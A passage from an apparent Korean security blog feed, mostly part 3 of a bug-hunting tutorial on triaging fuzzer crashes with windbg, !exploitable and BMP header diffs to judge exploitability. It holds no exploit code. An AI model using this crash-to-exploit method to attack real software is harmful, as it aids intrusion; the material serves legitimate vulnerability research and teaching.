&#xC11C;&#xBC84;&#xC5D0;&#xC11C; deserialization &#xB420; &#xB54C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>deserialization</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 3</title>
    <link href="/2021/03/24/l0ch/bughunting-tutorials-part3/"/>
    <url>/2021/03/24/l0ch/bughunting-tutorials-part3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a> </p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 2</a></p><p>&#xC800;&#xBC88; &#xAE00;&#xC5D0;&#xC11C; &#xC608;&#xACE0;&#xD588;&#xB358; &#xB300;&#xB85C;, &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xBC88; &#xAE00;&#xC740; &#xC0BD;&#xC9C8;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574; &#xC0BD;&#xC9C8;&#xB85C; &#xB05D;&#xB098;&#xB294; &#xAE00;&#xC774;&#xBBC0;&#xB85C; &#xBA58;&#xD0C8; &#xB098;&#xAC10;&#xC5D0; &#xC720;&#xC758;&#xD558;&#xC2DC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;&#x2026; &#xBB50; &#xC5B4;&#xCA0C;&#xB4E0; &#xC775;&#xC2A4; &#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xB2C8;&#xAE4C;&#xC694;! &#xADF8;&#xB7FC; Part 3 &#xC2DC;&#xC791;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="From-Crash-to-Exploit"><a href="#From-Crash-to-Exploit" class="headerlink" title="From Crash to Exploit"></a>From Crash to Exploit</h1><p>&#xC774;&#xC81C; &#xC81C; &#xD37C;&#xC800;&#xC5D0;&#xC11C; &#xB098;&#xC654;&#xB358; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.(&#xC704;&#xC5D0; &#xC788;&#xB294; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xB85C; &#xB3CC;&#xB9B0; &#xAC74; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC800;&#xB3C4; &#xADC0;&#xCC2E;&#xC544;&#xC11C; &#xADF8;&#xB0E5; &#xD06C;&#xB864;&#xB9C1;&#xD574;&#xC11C; &#xC37C;&#xC5B4;&#xC694; &#x314E;&#x314E;) </p><p>&#xC77C;&#xB2E8; &#xD06C;&#xB798;&#xC2DC; &#xD3F4;&#xB354;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--016.jpg" alt="./bughunting-tutorials-part3/image--016.jpg"></p><p>&#xB2E4;&#xB978; &#xAC70;&#xB97C; &#xBA3C;&#xC800; &#xBCF4;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xC7AC;&#xD604;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xD639; &#xAC00;&#xB2E4;&#xAC00; &#xC7AC;&#xD604;&#xC774; &#xC548; &#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD799; &#xBB38;&#xC81C;&#xC5EC;&#xC11C; &#xC7AC;&#xD604;&#xC774; &#xC548; &#xB418;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB300;&#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xC7AC;&#xD604;&#xC774; &#xC798; &#xC548; &#xB418;&#xB294; &#xD06C;&#xB798;&#xC2DC;&#xC77C; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30;&#xC5D0;&#xB3C4; &#xD798;&#xB4E4;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC7AC;&#xD604;&#xB418;&#xB294; &#xD655;&#xB960;&#xC744; &#xBCF4;&#xACE0; &#xD655;&#xB960;&#xC774; &#xB108;&#xBB34; &#xB0AE;&#xC73C;&#xBA74; &#xB2E4;&#xB978; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xC2DC;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC7AC;&#xD604;&#xC774; &#xB418;&#xB294; &#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xB54C;&#xC5D0;&#xB294; JIT &#xBAA8;&#xB4DC;&#xB85C; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xBD99;&#xC778; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC548; &#xBD99;&#xC778; &#xC0C1;&#xD0DC;&#xB791; &#xD799; &#xBC30;&#xC815; &#xB4F1;&#xC774; &#xC870;&#xAE08;&#xC529; &#xB2EC;&#xB77C;&#xC11C; &#xC7AC;&#xD604;&#xC774; &#xB418;&#xB358; &#xAC8C; &#xC548;&#xB418;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xC774;&#xC0C1;&#xD55C; &#xB370;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB098;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. Windbg&#xC758; &#xACBD;&#xC6B0; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD0A8; CMD &#xCC3D;&#xC5D0;&#xC11C; <code>windbg &#x2013;I</code> &#xBA85;&#xB839;&#xC5B4;&#xB9CC; &#xC785;&#xB825;&#xD558;&#xBA74; &#xBC14;&#xB85C; JIT &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC7AC;&#xD604;&#xC774; &#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xBCF4;&#xD1B5; msec &#xD655;&#xC7A5;&#xC790; &#xC804;&#xC5D0; <code>e0</code>&#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xBD05;&#xB2C8;&#xB2E4;. msec &#xD30C;&#xC77C;&#xC740; &#xD06C;&#xB798;&#xC2DC; &#xBC1C;&#xC0DD; &#xB54C;&#xC758; &#xBAA8;&#xB4E0; &#xB85C;&#xADF8;&#xB97C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xB370;&#xC694;. <code>e0</code>&#xC774; &#xC544;&#xB9C8; &#xCC98;&#xC74C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xB0AC;&#xC744; &#xB54C;&#xC758; &#xB85C;&#xADF8; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xB2E4;&#xB978; &#xAC70; &#xBD10;&#xB3C4; &#xB418;&#xAE34; &#xD558;&#xB294; &#xB370; &#xC800;&#xB294; &#xBCF4;&#xD1B5; &#xC774;&#xAC70; &#xD558;&#xB098;&#xB9CC; &#xBD10;&#xC694;. &#xC55E;&#xC5D0; &#xAC83;&#xB4E4;&#xC740; &#xC880; &#xB6F0;&#xC5B4;&#xB118;&#xACE0; &#xB4A4;&#xC5D0; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC815;&#xBCF4;&#xB4E4;&#xBD80;&#xD130; &#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled.png" alt="./bughunting-tutorials-part3/Untitled.png"></p><p>&#xC6B4; &#xC88B;&#xAC8C; &#xBC14;&#xB85C; <code>call</code>&#xC5D0;&#xC11C; &#xD130;&#xC84C;&#xB124;&#xC694;!!! &#xBB50; &#xC774;&#xAC70;&#xB294; &#xC6B4;&#xC774; &#xC88B;&#xC740; &#xACBD;&#xC6B0;&#xB2C8;&#xAE4C; &#x3160;&#x3160; &#xBCF4;&#xD1B5; &#xB2E4;&#xB978; &#xD06C;&#xB798;&#xC2DC;&#xB4E4;&#xC740; <code>call</code>&#xC774;&#xB098; <code>jmp</code>&#xC5D0;&#xC11C; &#xB098;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xAC70;&#xC758; &#xC5C6;&#xC8E0; &#x3160;&#x3160;&#x3160; &#xADF8;&#xB798;&#xB3C4; &#xBD84;&#xC11D; &#xBC29;&#xBC95;&#xC740; &#xB611;&#xAC19;&#xC73C;&#xB2C8;&#xAE4C; &#xAC4D; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xD06C;&#xB798;&#xC2DC;&#xC758; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC81C;&#xAC00; &#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; &#xD06C;&#xB864;&#xB9C1;&#xD574;&#xC11C; &#xB123;&#xC740; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC774;&#xB77C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBB50;&#xAC00; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xBAA8;&#xB985;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xC2DC;&#xB4DC; &#xD30C;&#xC77C;&#xC744; &#xC704;&#xC5D0;&#xC11C; &#xCC98;&#xB7FC; &#xC9C1;&#xC811; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC9C0;&#xB9CC; &#xADC0;&#xCC28;&#xB2C8;&#xC998;&#xC774; &#xBC1C;&#xB3D9;&#xD558;&#xACE0; &#xC9C1;&#xC811; &#xB9CC;&#xB4E4;&#xAE30; &#xD798;&#xB4E0; &#xD30C;&#xC77C;&#xB4E4;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; &#xD06C;&#xB864;&#xB9C1;&#xD574;&#xC624;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC740; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. (&#xC0AC;&#xC2E4; &#xAC00;&#xC7A5; &#xD070; &#xC774;&#xC720;&#xB294; &#xADC0;&#xCC2E;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;)</p><p>&#xC554;&#xD2BC; &#xC774;&#xB7F4; &#xB54C;&#xC5D0;&#xB294; &#xBA3C;&#xC800; hxd&#xB85C; &#xCEE8;&#xD2B8;&#xB864;&#xB41C; &#xAC12;&#xC744; &#xCC3E;&#xC544;&#xBCF4;&#xB294; &#xAC8C; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B4;&#xC774; &#xC88B;&#xC73C;&#xBA74; &#xC9C4;&#xC9DC; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC774; &#xBC14;&#xB85C; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xAC70;&#xB4E0;&#xC694;. &#xC800;&#xB3C4; &#xC774; &#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC6B4;&#xC774; &#xC88B;&#xAC8C;&#xB3C4; <code>ecx</code>&#xC758; &#xAC12;&#xC774; &#xBC14;&#xB85C; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xACE0; &#xBC14;&#xB85C; <code>ecx</code>&#xB97C; &#xCEE8;&#xD2B8;&#xB864;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xB4A4;&#xC5D0; &#xB098;&#xC624;&#xACA0;&#xC9C0;&#xB9CC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; ASLR &#xC774; &#xAC78;&#xB824;&#xC788;&#xC5B4;&#xC11C; &#xD070; &#xC758;&#xBBF8;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;) &#xBCF4;&#xD1B5; &#xAC12;&#xC5D0;&#xC11C; &#xB354;&#xD558;&#xAC70;&#xB098; &#xBE7C;&#xAC70;&#xB098; &#xB610; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB2E4;&#xB978; &#xAC12;&#xC744; &#xAC00;&#xC838;&#xC624;&#xAC70;&#xB098; &#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9CE;&#xC740; &#xAE30;&#xB300;&#xB97C; &#xD558;&#xBA74; &#xC548; &#xB429;&#xB2C8;&#xB2E4;&#x2026;. &#xD6C4;&#xC6B0;&#x2026; </p><p>&#xC774; &#xC815;&#xB3C4;&#xB85C;&#xB294; &#xB300;&#xCDA9; &#xC54C;&#xC558;&#xACE0; &#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%201.png" alt="./bughunting-tutorials-part3/Untitled%201.png"></p><p>&#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xC9C1;&#xC804; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xBD88;&#xB824;&#xC84C;&#xB294;&#xC9C0; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xC774;&#xB798; &#xB193;&#xACE0; &#xC2E4;&#xC81C;&#xB85C; &#xB514;&#xBC84;&#xAC70;&#xC5D0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xCF5C; &#xC2A4;&#xD0DD;&#xC774; &#xAE68;&#xC838;&#xC788;&#xAC70;&#xB098; &#xC880; &#xB2E4;&#xB974;&#xAC70;&#xB098; &#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xB294; &#xB370; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB0E5; &#xCC38;&#xACE0;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C;&#xB294; !exlploitable &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xB098;&#xC628; &#xACB0;&#xACFC;&#xBB3C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%202.png" alt="./bughunting-tutorials-part3/Untitled%202.png"></p><p>BFF&#xC5D0;&#xC11C;&#xB294; !exploitable &#xC758; &#xACB0;&#xACFC;&#xB85C; &#xD574;&#xB2F9; &#xD06C;&#xB798;&#xC2DC;&#xAC00; exploitable &#xD55C; &#xC9C0; &#xC548; &#xD55C; &#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC2E4; exploitable&#xB85C; &#xB098;&#xC628; &#xAC70;&#xB294; &#xADF8;&#xB7F4;&#xC2F8;&#xD558;&#xAE34; &#xD55C;&#xB370; &#xB2E4;&#xB978; &#xAC70;&#xB294; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xB124;&#xC694;. &#xAC1C;&#xC778;&#xC801;&#xC73C;&#xB85C;&#xB294; Unknown&#xC5D0; &#xC788;&#xB294; &#xD06C;&#xB798;&#xC2DC;&#xB4E4;&#xC774; &#xB354; &#xC775;&#xC2A4; &#xC798;&#xB41C;&#xB2E4;&#xB294; &#xB9D0;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC65C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB0AC;&#xB294;&#xC9C0;, exploitable &#xD55C; &#xC774;&#xC720;&#xAC00; &#xBB54;&#xC9C0;&#xB9CC; &#xCC38;&#xACE0;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xBA74; &#xB420; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC5B4;&#xB5A4; &#xC720;&#xD615;&#xC758; &#xD06C;&#xB798;&#xC2DC;&#xC778;&#xC9C0; &#xD30C;&#xC545;&#xC744; &#xD588;&#xACE0; &#xC774;&#xAC8C; &#xC775;&#xC2A4; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xBA74; &#xC5B4;&#xB5A4; &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xBBA4;&#xD14C;&#xC774;&#xD2B8; &#xB418;&#xC5C8;&#xB294; &#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xC54C;&#xC558;&#xC73C;&#xB2C8; &#xC5B4;&#xB5A4; &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xBBA4;&#xD14C;&#xC774;&#xD2B8; &#xB418;&#xC5C8;&#xB294; &#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;&#xBA74; &#xADF8; &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xB300;&#xCDA9;&#xC740; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xC65C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xB294;&#xC9C0; &#xCD94;&#xCE21;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACA0;&#xC8E0;.</p><p>Hxd&#xB85C; &#xC624;&#xB9AC;&#xC9C0;&#xB110; &#xD30C;&#xC77C;&#xACFC; minimized &#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xC11C; ctrl+k &#xB97C; &#xB204;&#xB974;&#xBA74; &#xB450; &#xD30C;&#xC77C;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--018.jpg" alt="./bughunting-tutorials-part3/image--018.jpg"></p><pre><code class="hljs c">BITMAPINFOHEADER.biSize : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x1f</span>BITMAPINFOHEADER.biCompression : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x0A</span>BITMAPINFOHEADER.biClrUsed : <span class="hljs-number">0x00</span> -&gt; <span class="hljs-number">0x02</span></code></pre><p>&#xC774;&#xB807;&#xAC8C; &#xBC14;&#xB00C;&#xC5C8;&#xB124;&#xC694;. <code>BiSize</code> &#xB294; <code>BITMAPINFOHEADER</code> &#xC758; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xB370; &#xC704;&#xC5D0; &#xBCF8; &#xAD6C;&#xC870;&#xB85C;&#xB294; &#xC544;&#xBB34;&#xB9AC; &#xBD10;&#xB3C4; &#xD06C;&#xAE30;&#xAC00; &#xB2EC;&#xB77C;&#xC9C8; &#xC218; &#xC5C6;&#xB2E4;&#xB294; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#x201C;&#xC5EC;&#xAE30;&#xC5D0; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xBCF5;&#xC0AC;&#xB97C; &#xD558;&#xB294; &#xB370; &#xC774; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAE30;&#xC874; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xB418;&#xBA74;&#xC11C; &#xBCF5;&#xC0AC;&#xB97C; &#xB354; &#xB9CE;&#xC774; &#xD558;&#xAC8C; &#xB41C;&#xACE0; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#x201D;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>biCompression</code> &#xACFC; <code>biClrUsed</code> &#xB294; &#xAC01;&#xAC01; &#xC555;&#xCD95; &#xBC29;&#xC2DD; &#xADF8;&#xB9AC;&#xACE0; &#xC0AC;&#xC6A9;&#xB41C; &#xC0C9;&#xC0C1;&#xC218;&#xB97C; &#xC758;&#xBBF8;&#xD558;&#xB294;&#xB370; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD574;&#xBD10;&#xC57C;&#xC9C0; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><p>&#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xAC74;&#xB370; &#xC0AC;&#xC2E4; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD558;&#xAE30; &#xC804; &#xD639;&#xC740; &#xD558;&#xBA74;&#xC11C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB290; &#xC815;&#xB3C4;&#xB294; &#xCD94;&#xCE21;&#xC744; &#xD558;&#xACE0; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD558;&#xBA74; &#xD655;&#xC2E4;&#xC774; &#xADF8;&#xB0E5; &#xB9C9;&#xBB34;&#xAC00;&#xB0B4;&#xB85C; &#xD558;&#xB294; &#xAC83;&#xBCF4;&#xB2E4;&#xB294; &#xC2DC;&#xAC04;&#xC774; &#xB35C; &#xC18C;&#xBAA8;&#xB418;&#xACE0; &#xD654;&#xAC00; &#xB35C; &#xB0A9;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xC77C;&#xBD80;&#xB85C; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC791;&#xC131; &#xC548; &#xD558;&#xACE0; &#xC9C4;&#xD589;&#xD560; &#xAC83;&#xC774;&#xC9C0;&#xB9CC; &#xC774; &#xAE00;&#xC744; &#xB2E4; &#xC77D;&#xACE0; &#xC2E4;&#xC81C;&#xB85C; &#xC9C4;&#xD589;&#xD560; &#xB54C;&#xC5D0;&#xB294; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC0DD;&#xAC01;&#xD574;&#xB450;&#xACE0; &#xC9C4;&#xD589;&#xD558;&#xBA74; &#xC88B;&#xACA0;&#xC8E0;.</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB514;&#xBC84;&#xAC70;&#xC5D0; &#xBD99;&#xC5EC;&#xC11C; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xD574;&#xBCFC;&#xAC8C;&#xC694;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAE45;&#xC740; &#xBAA8;&#xB450; windbg&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCC98;&#xC74C; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC744; &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC774;&#xC804;&#xBD80;&#xD130; &#xC368;&#xC624;&#xAE30;&#xB3C4; &#xD588;&#xACE0; GUI &#xAC00; &#xD55C;&#xB208;&#xC5D0; &#xB531; &#xB4E4;&#xC5B4;&#xC640;&#xC11C; &#xC774;&#xBBA4;&#xB2C8;&#xD2F0;&#xB97C; &#xC4F0;&#xAE34; &#xD588;&#xB294; &#xB370; &#xC18D;&#xB3C4; &#xBB38;&#xC81C; &#xB54C;&#xBB38;&#xC5D0; windbg&#xB85C; &#xB118;&#xC5B4;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC775;&#xC2A4; &#xD560; &#xB54C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD574;&#xC57C; &#xD558;&#xB294; &#xB370; &#xC815;&#xB9D0; &#xC18D; &#xD130;&#xC838;&#xC11C;;;; &#xC81C; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC758; &#xC0AC;&#xC591;&#xC774; &#xB0AE;&#xC544;&#xC11C;&#xB3C4; &#xC788;&#xACA0;&#xC9C0;&#xB9CC; &#xC544;&#xC608; &#xBED7;&#xC5B4;&#xBC84;&#xB9AC;&#xB354;&#xB77C;&#xAD6C;&#xC694;. &#xADF8;&#xB798;&#xC11C; windbg&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xB354;&#xB2C8; &#xC2DC;&#xAC04;&#xC774; &#xB9CE;&#xC774; &#xB2E8;&#xCD95;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC4F0;&#xB2E4; &#xBCF4;&#xB2C8;&#xAE4C; &#xC6D0;&#xD558;&#xB294; &#xAC70;&#xB97C; &#xBA85;&#xB839;&#xC5B4;&#xB9CC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xCE58;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xAC83;&#xB9CC; &#xB531; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC11C; &#xD3B8;&#xD558;&#xAE30;&#xB3C4; &#xD574;&#xACE0;&#x2026; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC4F0;&#xACE0; &#xC788;&#xB124;&#xC694; &#x314B;&#x314B; &#xCC98;&#xC74C;&#xC5D0;&#xB294; CUI&#xB77C;&#xB294; &#xAC8C; &#xC880; &#xB9CE;&#xC774; &#xC5B4;&#xC0C9;&#xD558;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xD06C;&#xB798;&#xC2DC; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xACC4;&#xC18D; &#xC4F0;&#xB2E4; &#xBCF4;&#xBA74; &#xC775;&#xC219;&#xD574;&#xC9D1;&#xB2C8;&#xB2F9;.  </p><p><a href="http://windbg.info/doc/1-common-cmds.html">http://windbg.info/doc/1-common-cmds.html</a> </p><p>windbg &#xC4F8; &#xB54C; &#xC704; &#xB9C1;&#xD06C;&#xB97C; &#xC606;&#xC5D0; &#xB744;&#xC6CC;&#xB193;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xAC70; &#xD558;&#xB098;&#xD558;&#xB098; 